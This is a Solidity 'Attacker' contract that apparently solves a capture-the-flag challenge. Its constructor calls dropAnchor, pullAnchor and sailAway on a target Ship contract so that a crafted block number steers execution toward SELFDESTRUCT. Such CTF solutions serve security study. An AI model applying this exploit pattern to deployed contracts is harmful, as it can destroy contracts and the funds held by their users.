pragma solidity ^0.8.0;

// Option 1
import "src/CTF3/Ship.sol";

// Option 2
/*interface IShip {
    function sailAway() external;
    function pullAnchor() external;
    function dropAnchor(uint blockNumber) external;
}*/

contract Attacker {
    
    // Option 1
    Ship internal ship;

    // Option 2
    address shipAddress;

    constructor (address _shipAddress) {
        // Everything should be done from the constructor to avoid generating runtime code

        // Option 1
        ship = Ship(_shipAddress);

        // The block number adds OP CODES -> We need to get to the SELFDESTRUCT
        ship.dropAnchor(123456789); // 4294967296
        ship.pullAnchor();
        ship.sailAway();

        // Option 2
        /*shipAddress = _shipAddress;
        IShip(shipAddress).dropAnchor(123456789);
        IShip(shipAddress).pullAnchor();
        IShip(shipAddress).sailAway();*/
    }  

    receive() payable external {}
}